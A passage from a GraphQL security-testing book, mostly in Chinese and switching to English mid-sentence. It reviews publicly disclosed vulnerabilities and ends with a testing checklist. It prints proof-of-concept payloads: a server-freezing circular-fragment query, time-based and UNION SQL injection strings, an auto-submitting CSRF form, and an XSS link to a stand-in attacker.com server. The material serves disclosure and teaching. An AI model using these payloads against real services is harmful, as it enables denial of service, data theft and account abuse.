  \ Agoo 服务器的查询可以通过多种方式使其崩溃。让我们探讨一下我们如何使用循环片段做到这一点。\n\n作为第一步，我们想检查 introspection 是否默认启用，因此我们运行了以下查询：\n\
  \n```\nquery Introspection {\n  __schema {\n    directives {\n      name\n    }\n\
  \  }\n}\n```\n\n此查询很简单；它返回模式中所有指令的名称。当你还不知道 GraphQL 服务器支持哪些操作时，这是一个很好的查询。\n\n接下来，我们使用引用查询的片段构建了一个循环查询：\n\
  \n```\nquery CircularFragment {\n  __schema {\n    ① ...A\n  }\n}\n\nfragment A\
  \ on __Schema {\n  directives {\n    name\n  }\n  ② ...B\n}\n\nfragment B on __Schema\
  \ {\n  ③ ...A\n}\n```\n\n我们创建了两个针对 __Schema 类型的片段。第一个片段 A 使用 directives 顶级字段和 name\
  \ 字段。它然后在 ② 处调用（或导入）片段 B。片段 B 在 ③ 处包含 …A，这再次调用片段 A。此时，我们有两个循环片段。现在，为了让它们执行，我们需要在查询中使用其中一个。在\
  \ ① 处，你可以看到我们如何在 __schema meta-field 内部通过调用 …A 来使用片段 A。\n\n此时，循环条件开始，并且永远不会结束！在\
  \ Agoo 上运行此查询将冻结服务器，并且它将不再能够提供查询。恢复它的唯一方法是重新启动 Agoo 的服务器进程。\n\n其中一些 DoS 漏洞是在使用 GraphQL\
  \ 已有一段时间的知名产品中发现的，证明没有人能免疫漏洞。\n\n## 损坏的授权\n\n在本节中，我们将探讨影响 GraphQL API 中授权控制的漏洞。这些类型的问题最终可能导致数据泄露并允许未经授权访问敏感信息。\n\
  \n### 允许停用用户的数据访问（GitLab）\n\n在一个于 2021 年 8 月公开披露并报告给 GitLab 的漏洞中，一个名为 Joaxcar 的黑客能够通过使用停用的用户帐户对\
  \ GraphQL API 进行身份验证并执行不应该被允许的操作来访问数据（https://hackerone.com/reports/1192460）。\n\n\
  停用的用户帐户应该在维护者重新激活之前拒绝其访问。虽然用户被停用时，应用程序应拒绝用户的访问尝试，无论是通过控制台直接还是通过 API 密钥，即使他们拥有活动的\
  \ API 密钥。\n\n为了理解这带来的风险，想象一下一名员工休假，安全团队的政策是在他们返回办公室之前禁用所有员工帐户。现在想象一下该员工的密码已泄露到互联网上，并且威胁行为者拥有这些凭据。在我们描述的漏洞场景中，威胁行为者将能够调用应用程序，即使用户的帐户已禁用。如果有适当的身份验证和授权控制，这不应该发生。\n\
  \n以下是 Joaxcar 为利用漏洞所做的事情：\n\n- 1. 作为管理员，使用 API 密钥创建了一个次要用户\n- 2. 仍作为管理员，禁用了新创建的用户\n\
  - 3. 使用已停用用户的 API 密钥调用 GraphQL API\n- 4. 确认他们能够成功地使用已停用用户的凭据执行操作\n\n\n\n\n\n他们在测试中使用了以下\
  \ GraphQL 查询：\n\n```\nmutation {\n  labelCreate(input:{title:\"deactivated\", projectPath:\"\
  test1/test1\"}){\n    errors\n    label {\n      id\n    }\n  }\n}\n```\n\n该查询使用带有输入类型参数的\
  \ labelCreate 对象，该参数接受 title 和 projectPath。换句话说，此漏洞允许道德黑客使用已停用的账户来创建标签字段。很可能该漏洞也允许执行除创建标签之外的其他操作。\n\
  \n> 注意 用于利用的 API 令牌（代码片段中未显示）作为 Bearer 令牌传递给 Authorization HTTP 头。\n\n## 允许无特权的员工修改客户的电子邮件（Shopify）\n\
  \n以下漏洞由用户 ash_nz 于 2021 年 9 月报告给 Shopify 漏洞赏金计划（https://hackerone.com/reports/980511）。电子商务公司\
  \ Shopify 多年来一直是 GraphQL 领域的先行者，开发了有用的开源工具，发布了关于 GraphQL 最佳实践的文章等。\n\n该漏洞允许 ash_nz\
  \ 使用无特权的商店员工账户修改客户电子邮件，该账户可通过专用的 GraphQL API 突变来更新电子邮件对象。以下是报告中显示的突变：\n\n```\nmutation\
  \ emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!) {\n\
  \  emailSenderConfigurationUpdate(input:$input) {\n    emailSenderConfiguration\
  \ {\n      id\n    }\n    userErrors {\n      field\n      message\n    }\n  }\n\
  }\n```\n\n黑客将客户的电子邮件传递给突变的输入参数并发送到 GraphQL API 服务器，后者更新了客户的电子邮件，尽管 API 调用方没有执行此操作的权限。\n\
  \n这是一个相当简单的漏洞，但识别它需要测试多个假设和边界情况。始终使用各种特权级别评估 API，并尝试跨账户或跨用户访问以发现授权问题。\n\n黑客因负责任地披露此问题而从\
  \ Shopify 获得了 1,500 美元的赏金。\n\n## 通过团队对象披露允许的黑客数量（HackerOne）\n\n2018 年 4 月，代号为 haxta4ok00\
  \ 的道德黑客在 HackerOne 中发现了 GraphQL 授权问题，导致信息泄露漏洞（https://hackerone.com/reports/342978）。\n\
  \n黑客发现，通过使用 HackerOne GraphQL API 中的 team 对象进行查询，他们可以访问本不应访问的受限字段。team 对象允许查询 HackerOne\
  \ 平台上的程序并返回其 id 和 name 等信息。\n\n黑客还发现，当指定 whitelisted_hackers 字段时，它会返回程序允许的黑客数量的\
  \ total_count。由于 team 对象接受 handle 参数，因此实际上允许根据 handle 字符串搜索程序。在以下示例中，handle 为 security：\n\
  \n```\nquery {\n    team(handle:\"security\"){\n        id\n        name\n     \
  \   handle\n        whitelisted_hackers {\n            total_count\n        }\n\
  \    }\n}\n```\n\nHackerOne 分诊团队能够确定，此漏洞也可能允许某人通过向 handle 参数提供各种可能匹配团队 handle 的字符串来识别平台上的其他非公开程序。对查询的响应如下：\n\
  \n```\n--snip--\n\"team\":{\n    \"id\":\"Z2lkOi8vaGFja2Vybz5l1R1YwovMTM=\",\n \
  \   \"name\":\"HackerOne\",\n    \"handle\":\"security\",\n    \"whitelisted_hackers\"\
  :{\n        \"total_count\":30\n    }\n}\n--snip--\n```\n\n正如您所见，所披露的信息本质上并不敏感，但可用于推断程序是否私有，从而找到\
  \ HackerOne 的客户。\n\nHackerOne 因信息泄露影响而为此授权问题支付了 2,500 美元的赏金。\n\n## 读取私有笔记（GitLab）\n\
  \nGitLab 上创建的问题可能包含只有成员才能查看的私有笔记。2019 年 6 月，代号为 ngalog 的道德黑客通过 HackerOne 报告（https://hackerone.com/reports/633001）报告了\
  \ CVE-2019-15576，显示黑客可以通过 GitLab 的 GraphQL API 读取这些笔记，尽管它们在 REST API 中已正确受限。\n\n\
  笔记可能很敏感，因为它们可能包含有关重复问题、问题移至另一个项目的信息，甚至项目代码。道德黑客使用以下查询来利用该漏洞：\n\n```\nquery {\n \
  \ project(fullPath:\"username16/ci-test\"){\n    issue(iid:\"1\"){\n      descriptionHtml\n\
  \      notes {\n        edges {\n          node {\n            bodyHtml\n      \
  \      system\n            author {\n              username\n            }\n   \
  \         body\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n正如您所见，issue\
  \ 对象与 notes 字段一起使用。此 notes 字段允许访问其他字段，例如笔记正文、笔记作者等。图 10-4 中的屏幕截图取自 GitLab GraphQL\
  \ API 文档，显示了可用字段的完整列表。\n\n| Fields |  |  |\n| Name | Type | Description |\n| author\
  \ | UserCore! | User who wrote this note. |\n| body | String! | Content of the note.\
  \ |\n| bodyHtml | String | The GitLab Flavored Markdown rendering of note. |\n|\
  \ confidential | Boolean | Indicates if this note is confidential. |\n| createdAt\
  \ | Time! | Timestamp of the note creation. |\n| discussion | Discussion | Discussion\
  \ this note is a part of. |\n| id | NoteID! | ID of the note. |\n\n图 10-4：GitLab\
  \ 的 note 字段文档\n\n完整的 GitLab GraphQL API 文档可在 https://docs.gitlab.com/ee/api/graphql/reference\
  \ 找到。\n\n## 披露付款交易信息（HackerOne）\n\n以下漏洞于 2019 年 10 月报告给 HackerOne，影响了其自身的 GraphQL\
  \ API（https://hackerone.com/reports/707433）。它允许发现并披露该问题的黑客 msdian7 访问付款交易总数的信息——该信息本应保密且仅限授权方访问。\n\
  \n使用的 GraphQL 查询如下所示：\n\n```\nquery ($handle_0: String!, $size_1: ProfilePictureSizes!)\
  \ {\n  team(handle: $handle_0) {\n    id\n    name\n    about\n    profile_picture(size:\
  \ $size_1)\n    offers_swag\n    offers_bounties\n    base_bounty\n    payment_transactions\
  \ {\n      total_count\n    }\n  }\n}\n```\n\n> 注意 报告中的原始查询使用了 GraphQL 片段。为简洁起见，我们将片段与查询合并。\n\
  \n付款数据绝不应该是公开信息。此漏洞允许通过 payment_transactions 字段访问 total_count 字段，使用未经授权的会话，从而有效地提供了对\
  \ HackerOne 平台上其他漏洞赏金计划所进行的交易情况的洞察。\n\n## 信息披露\n\n在本节中，我们将回顾公开披露的仅导致信息泄露问题的漏洞。我们在本章前面讨论的一些问题也导致了信息泄露结果，尽管这些源于其他漏洞，例如破坏的访问控制机制。\n\
  \n## 枚举 GraphQL 用户（GitLab）\n\n2021 年，Rapid7 在 GitLab 社区版和企业版中发现了 CVE-2021-4191。该漏洞允许未经身份验证的攻击者访问已通过\
  \ users 字段特别限制其用户注册界面的私有 GitLab 实例中的用户信息。\n\n例如，以下查询返回 GitLab 实例中用户的信息，例如其姓名、用户名和\
  \ ID：\n\n```\nquery {\n  users {\n    nodes {\n      id\n      name\n      username\n\
  \    }\n  }\n}\n```\n\n除了用户的姓名和用户名外，该漏洞还影响了其电子邮件、位置、用户权限、群组成员身份、状态和个人资料图片等字段。拥有如此多关于用户的信息有多种用途：\n\
  \n- 识别攻击账户。了解用户名和电子邮件允许威胁行为者针对特定账户。访问用户电子邮件还允许威胁行为者转向其他攻击，例如通过向用户发送钓鱼邮件进行社会工程。\n\
  - 识别可用群组。该漏洞允许攻击者通过其群组成员身份推断运行 GitLab 的公司信息。群组成员身份可以揭示有关收购、子公司、其他公司分支、公司运营地区等信息。\n\
  - 识别个人。该漏洞允许访问个人资料图片，这可以帮助威胁行为者在 GitLab 外的平台上针对特定用户。\n- 识别账户状态。知道账户状态（是否已禁用或启用）可以使暴力破解等攻击更有效；威胁行为者可以仅针对处于启用状态的账户，从而优化其攻击。\n\
  \n\n\n\n\n这个漏洞之所以特别有趣，是因为它利用起来非常简单直接。能够以未认证的方式进行攻击，也大大增加了其严重性。\n\n## 通过 WebSocket\
  \ 访问内省查询（Nuri）\n\n这是一份有趣且相当独特的报告。2020 年 4 月，一位化名为 zerodivisi0n 的道德黑客披露了 Nuri API\
  \ 中的一个漏洞，导致通过内省查询泄露了模式信息（https://hackerone.com/reports/862835）。该 GraphQL API 使用\
  \ WebSocket 作为传输协议，而不是 HTTP。\n\n在前面的章节中，你已经在订阅操作的上下文中了解了 GraphQL 和 WebSocket；客户端可以通过\
  \ WebSocket 协议订阅某些感兴趣的事件以获取实时信息。某些 GraphQL 库，例如 graphql-ws（https://github.com/enisdenjo/graphql-ws），不仅允许通过\
  \ WebSocket 发送订阅，还允许发送查询和变更。\n\n所报告的漏洞使黑客能够直接通过 WebSocket 连接执行内省查询。虽然报告中并没有详细介绍\
  \ GraphQL 实现的设计方式，但内省在非基于 WebSocket 的接口上是被禁用的，例如通过 HTTP 发送的查询操作。\n\n通过 WebSocket\
  \ 客户端到服务器消息的内省查询可能如下所示：\n\n```\n{\"type\":\"start\",\"payload\":{\"query\":\"query\
  \ Introspection { __schema {...} }\"}}\n```\n\n通过 WebSocket 发送的查询和变更操作目前并不常见。你更有可能看到\
  \ GraphQL 订阅操作通过 WebSocket 传输，但随着 GraphQL 趋势的发展，这可能会随时间而改变。\n\n## 注入\n\n以下公开披露的\
  \ GraphQL 漏洞导致了应用注入缺陷。第 8 章介绍了注入以及如果被利用会产生多大的影响。\n\n## GET 查询参数中的 SQL 注入（HackerOne）\n\
  \n2018 年 11 月，Jobert 在 HackerOne 的 GraphQL 生产端点中发现了一个 SQL 注入（https://hackerone.com/reports/435066）。Jobert\
  \ 发现了一个传递给 HackerOne GraphQL /graphql 端点的非标准参数 embedded_submission_form_uuid，看起来如下：\n\
  \n/graphql?embedded_submission_form_uuid=value\n\n该 URL 参数在 GraphQL API 中并不标准，你更有可能看到以下参数：\n\
  \n- query\n- variables\n- operationName\n\n你应该已经熟悉这些：query 采用其值作为完整的 GraphQL 查询，variables\
  \ 采用传递给查询的额外数据（例如参数值），operationName 是操作的名称。Jobert 能够确定传递给自定义参数的值在后端未被检查，从而有效地允许他们注入\
  \ SQL 命令。\n\nHackerOne 的分诊团队分享了负责处理 GraphQL 参数的 Ruby 代码，我们在此对其进行了修改以使问题更明显：\n\n\
  ```\nunless database_parameters_up_to_date\n  safe_query = ''\n\n  ① new_parameters\
  \ = {\"embedded_submission_form_uuid\":\"PAYLOAD\"}\n\n  new_parameters.each ② do\
  \ |key, value|\n    safe_query += \"SET SESSION #{key} TO #{value};\"\n  end\n\n\
  \  begin\n    # safe_query =\"SET SESSION embedded_submission_form_uuid TO PAYLOAD\"\
  \n    connection.query(safe_query)\n  rescue ActiveRecord::StatementInvalid => e\n\
  \    raise e unless e.cause.is_a? PG::InFailedSqlTransaction\n  end\n\nend\n```\n\
  \nnew_parameters 变量 ① 是一个哈希映射，包含自定义的 embedded_submission_form_uuid URL 参数及其值（由客户端控制）。在\
  \ ② 处，一个循环对分配给该变量的键和值执行字符串插值，有效地将参数及其值组合成一个字符串。它将此字符串与 SET SESSION SQL 命令组合。\n\n\
  新的 SQL 命令最终被分配给 safe_query 变量，此时攻击者可以无需任何检查对其进行控制。我们使用注释突出显示了分配给该变量的值：GET 参数 embedded_submission_form_uuid\
  \ 键及其值。该变量最终被转换为 SQL 查询并执行。GraphQL 参数也不会自动进行清理，这也促成了 SQL 注入条件。\n\nJobert 制作了一个特殊的\
  \ cURL 请求来验证注入：\n\n```\ntime curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=\\\
  n1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(10\\)%3B--%27\n\n0.02s user 0.01s system\
  \ 0% cpu 10.557 total\n```\n\n此 cURL 请求的 URL 解码版本如下所示：\n\n/graphql?embedded_submission_form_uuid=1';SELECT\
  \ 1;SELECT pg_sleep\\(10\\);--'\n\n该请求使用基于时间的 SQL 注入技术（第 8 章中介绍）通过使用 PostgreSQL\
  \ 命令 pg_sleep 在服务器处理中引入了 10 秒的时间延迟。然后攻击者使用 Linux time 命令跟踪服务器响应请求所需的时间。完成耗时 10.557\
  \ 秒。\n\n该技术不仅证实了漏洞的存在，而且避免了意外泄露敏感信息或向数据库发送可能导致数据丢失的危险命令。\n\n## 对象参数中的 SQL 注入（Apache\
  \ SkyWalking）\n\nApache SkyWalking 是由 Apache 软件基金会创建的面向微服务和云原生架构的性能监控平台。2020 年 6\
  \ 月，它因通过传递给 GraphQL 字段参数的值而引入的 SQL 注入漏洞而受损。该漏洞被分配了标识符 CVE-2020-9483。\n\nSkyWalking\
  \ 可以使用各种存储后端，例如 H2、OpenSearch、PostgreSQL 和 TiDB。一位化名为 Jumbo-WJB 的黑客发现，当 SkyWalking\
  \ 与 H2 或 MySQL 存储后端一起使用时，它容易通过 getLinearIntValues 字段 metric 参数进行 SQLi。\n\nJumbo-WJB\
  \ 发布了该漏洞的利用代码，在 GraphQL 查询中构造了一个特殊有效负载，利用该漏洞实现 SQLi。在以下示例查询中，你可以看到作为输入传递给 metric\
  \ 参数的 id 的值包含 SQL 查询语法：\n\n```\nquery SQLi($d: Duration!) {\n  getLinearIntValues(metric:\n\
  \  {name: \"all_p99\", id: \"') UNION SELECT 1,CONCAT('~', '9999999999', '~')--\"\
  },\n  duration: $d) {\n    values {\n      value\n    }\n  }\n}\n```\n\n对于一个值，metric\
  \ 参数期望一个包含 id 和 name 等键的对象。该漏洞似乎出现在 id 键中，该键在插入 H2 或 MySQL 数据库之前未经过清理。\n\nNOTE 该漏洞的完整利用代码可以在\
  \ Nuclei 漏洞扫描器项目的公共存储库中找到，地址为 https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-9483.yaml。\n\
  \n通过检查包含修复的 SkyWalking GitHub 仓库的拉取请求，我们可以了解易受攻击的代码区域可能是什么样子（图 10-5）。\n\n```\n110\
  \ public IntValues getLinearIntValues(String tableName, DownSampling downsampling,\
  \ List<String> ids,\n111 String valueCName) throws IOException {\n112 - StringBuilder\
  \ idValues = new StringBuilder();\n113 - for (int valueIdx = 0; valueIdx < ids.size();\
  \ valueIdx++) {\n114 - if (valueIdx != 0) {\n115 - idValues.append(\",\");\n116\
  \ }\n117 - idValues.append(\"'\").append(ids.get(valueIdx)).append(\"'\");\n118\
  \ }\n119 \n120 IntValues intValues = new IntValues();\n121 \n122 try (Connection\
  \ connection = h2Client.getConnection()) {\n123 \n124 try (ResultSet resultSet =\
  \ h2Client.executeQuery(\n125 - connection, \"select id, \" + valueCName + \" from\
  \ \" + tableName + \" where id in (\" + idValues.toString() + \")\") {\n```\n\n\
  图 10-5：Apache SkyWalking 的易受攻击代码\n\ngetLinearIntValues 方法接受一些参数，例如 tableName、valueCName\
  \ 和 ids（第 110 行），并使用 Java 的 StringBuilder 进行一些字符串构建（第 112 行）。然后使用循环遍历传递给 ids 参数的值并通过连接它们并使用单引号装饰它们来构造一个字符串（第\
  \ 113 至 118 行）。新构建的字符串最终被用作 SQL 查询的一部分而未进行清理（第 123 至 125 行）。\n\nmetric 对象的 id GraphQL\
  \ 参数很可能直接插入到 ids 列表中，因此允许注入 SQL 命令。\n\n## 跨站脚本（GraphQL Playground）\n\nCVE-2021-41249\
  \ 是影响 GraphQL Playground IDE 的反射型 XSS 漏洞，该 IDE 提供了发送查询到 API 的界面，以及原始模式信息、有关 API\
  \ 功能的文档以及从内联 SDL 代码注释中获取的信息。此信息部分由在 GraphQL Playground 加载时自动发送的内省查询填充。其他信息可能来自 GraphQL\
  \ 服务器。\n\n与本章迄今为止介绍的漏洞相比，此漏洞相当不同。首先，它直接影响 API 消费者，因为成功的\n\n\n\nexploitation would\
  \ execute in their browser. Second, attackers could exploit it in two ways:\n\n\
  - By compromising a GraphQL server and modifying its schema to include dangerous\
  \ characters.\n- By building a custom GraphQL server with a malicious payload implemented.\
  \ The attacker could then target the client by sending them a link to load the GraphQL\
  \ Playground with the malicious server’s address—for example, http://blackhatgraphql.com/graphql?endpoint=http://attacker.com/graphql?query={__typename}.\
  \ If the victim clicks the link, their browser will automatically load the malicious\
  \ API and run a query on their behalf, which executes the payload into the Playground\
  \ running in their browser and triggers the XSS.\n\nLet’s explore how a GraphQL\
  \ server could serve such malicious payloads. Consider the following code sample\
  \ from DVGA:\n\n```\nclass UserObject(SQLAlchemyObjectType):\n    class Meta:\n\
  \        name = \"MyMaliciousTypeName\"\n        model = User\n```\n\nThis code\
  \ represents DVGA’s UserObject object. Developers could use the name variable to\
  \ rename an object’s name to a custom string, and a threat actor could do the same\
  \ if they’ve compromised the server (or simply hosted their own version of it).\
  \ This name will then get rendered in an IDE tool’s documentation section (Figure\
  \ 10-6).\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_291_0.png)\n\nFigure 10-6:\
  \ A malicious type name shown in a search\n\nWhen a client opens the GraphQL Playground\
  \ to query the API, the malicious JavaScript payload will be rendered in their browser,\
  \ which, in this case, is injected into a type’s name.\n\nThis exact vulnerability\
  \ existed in the Playground Node Package Manager (npm) package graphql-playground-react.\
  \ In late 2021, the library maintainers took the following steps to remediate the\
  \ vulnerability:\n\n- Ensuring that any HTML text is escaped\n- Ensuring that type\
  \ names conform to the GraphQL specification\n- Avoiding loading the documentation\
  \ section if it contains dangerous characters\n- Ensuring that user-generated HTML\
  \ is checked and made safe\n\nGraphQL IDEs are popular, so if you’re performing\
  \ a penetration test and identify an old version of GraphQL Playground, it’s possible\
  \ that it hasn’t been patched and is still vulnerable to this XSS. Alternatively,\
  \ you could host your own malicious GraphQL server containing the vulnerable Playground\
  \ library and trick a victim into visiting it.\n\n## Cross-Site Request Forgery\
  \ (GitLab)\n\nEarlier in the book, we highlighted techniques for identifying GraphQL\
  \ APIs that allow GET-based queries. Let’s now see how a hacker was able to abuse\
  \ this functionality. In March 2021, the hacker az3z3l disclosed a CSRF vulnerability\
  \ to GitLab (https://hackerone.com/reports/1122408).\n\nWhen handling GraphQL queries\
  \ over the POST method, GitLab uses a special X-CSRF-Token HTTP header to protect\
  \ against CSRF attacks. This header includes a unique token in each request or query.\n\
  \nGET requests aren’t typically used for actions such as data modifications, so\
  \ companies don’t usually protect them with anti-CSRF tokens. But because GitLab\
  \ supported queries using GET, the CSRF protection in place did not apply to those\
  \ queries, even though these operations included queries and mutations and had the\
  \ ability to perform changes through the API.\n\nEthical hacker az3z3l provided\
  \ proof-of-concept HTML code that abuses the CSRF vulnerability:\n\n```\n--snip--\n\
  <form action=\"https://gitlab.com/api/graphql/\" id=\"csrf-form\" method=\"GET\"\
  > ①\n<input name=\"②\" \"query\" value=\"mutation CreateSnippet($input: CreateSnippetInput!)\
  \ --snip--\">\n<input name=\"③\" \"variables\" value='{\"input\":{\"title\":\"Tesssst\
  \ Snippet\"} --snip--'>\n</form>\n--snip--\n<script>document.getElementById(\"csrf-form\"\
  ).submit()</script> ④\n```\n\nThis HTML code defines a submission form ① that includes\
  \ two inputs: query ②, which specifies the use of a mutation named CreateSnippet,\
  \ and variables ③, which holds a few variables passed via the input type. At ④,\
  \ the code uses JavaScript to submit the form on behalf of the client as soon as\
  \ a\n\nclient loads an HTML page that contains it. Because the API doesn’t check\
  \ for a CSRF protection header, this is possible.\n\nThe GraphQL mutation used in\
  \ the exploit is as follows:\n\n```\nmutation CreateSnippet($input: CreateSnippetInput!)\
  \ {\n  createSnippet(input: $input) {\n    errors\n    snippet {\n      webUrl\n\
  \      __typename\n    }\n    --snip--\n  }\n}\n```\n\nAs a result of this query,\
  \ a snippet will be created on behalf of the client with whatever data the attacker\
  \ included in the HTML form. This CSRF could let the attacker take sensitive actions\
  \ on behalf of the victim, such as accessing their account or data.\n\n## Summary\n\
  \nThis chapter covered public disclosures of real-life vulnerabilities and exploits.\
  \ You learned about how certain design choices in GraphQL implementations created\
  \ vulnerabilities that led to information disclosure, injections, authorization\
  \ issues, and more. We also discussed some of the mitigation approaches companies\
  \ took to patch the vulnerabilities, where possible.\n\nThis book introduced you\
  \ to GraphQL’s new ways of querying APIs. As you’ve learned, the framework has its\
  \ own rules, advantages, and disadvantages. GraphQL’s design introduces new vulnerabilities\
  \ and security challenges. Simultaneously, it remains prone to the classic vulnerabilities\
  \ that have existed for years. Now that you know how to find vulnerabilities in\
  \ GraphQL, we recommend that you try to poke holes in the GraphQL applications made\
  \ available through vulnerability disclosure programs. Who knows; maybe you’ll make\
  \ a buck or two.\n\n## A\n\n## GRAPHQL API TESTING\nCHECKLIST\n\n## Reconnaissance\n\
  \n- Perform a port scan using Nmap to identify open web application ports.\n- Scan\
  \ the web server for GraphQL endpoints by using Graphw00f's detection mode.\n- Perform\
  \ server fingerprinting with Graphw00f's fingerprint mode.\n- Search for server-level\
  \ vulnerabilities on MITRE's CVE database.\n- Search for server-level security features\
  \ on GraphQL Threat Matrix.\n- Search for GraphQL IDEs such as GraphiQL Explorer\
  \ or GraphQL Playground by using EyeWitness.\n- Send an introspection query and\
  \ document all available queries, mutations, and subscriptions.\n- Visualize the\
  \ introspection query response with GraphQL Voyager.\n\n## Denial of Service\n\n\
  - Review the API's SDL file for bidirectional relationships.\n- Test for the following:\n\
  \  - Circular queries or mutations\n  - Circular fragments\n  - Field duplication\n\
  \  - Alias overloading\n  - Directive overloading\n  - Array-based or alias-based\
  \ query batching\n  - Object limit overriding in API pagination arguments such as\
  \ filter, max, limit, and total\n\n## Information Disclosure\n\n- Extract the GraphQL\
  \ schema by using field stuffing when introspection is disabled.\n- Identify debug\
  \ errors in query responses by sending malformed queries.\n- Identify query tracing\
  \ in GraphQL responses.\n- Test for any PII submitted using queries over the GET\
  \ method.\n\n## Authentication and Authorization\n\n- Test access to the following:\n\
  \  - The API without authentication headers\n  - Restricted fields by using alternate\
  \ paths\n  - The API by using both the GET and POST methods\n- Test signature validation\
  \ in JSON Web Token (JWT).\n- Attempt to brute-force mutations or queries that accept\
  \ secrets, such as tokens or passwords, using the following:\n  - Alias-based query\
  \ batching\n  - Array-based query batching\n  - CrackQL\n  - Burp Suite\n\n## Injection\n\
  \n- Test for injection in the following:\n  - Query arguments\n  - Field arguments\n\
  \  - Query directive arguments\n  - Operation names\n- Test for SQLi automatically\
  \ by using SQLmap.\n- Test for OS command injection automatically by using Commix.\n\
  \n## Forging Requests\n\n- Test for the following:\n  - The existence of anti-CSRF\
  \ tokens in HTTP headers or bodies\n  - Possible anti-CSRF token bypasses\n  - The\
  \ availability of GET-based queries\n  - Support for GET-based mutations\n- Perform\
  \ state-changing mutations over GET.\n- Perform state-changing mutations over POST.\n\
  \n## Hijacking Requests\n\n- Identify whether the GraphQL server does the following:\n\
  \  - Supports subscriptions\n  - Validates the Origin header during a WebSocket\
  \ handshake\n\n\n\n\n\n# B\n\n# GRAPHQL 安全资源\n\n# 渗透测试技巧与窍门\n\n- OWASP 的 GraphQL\
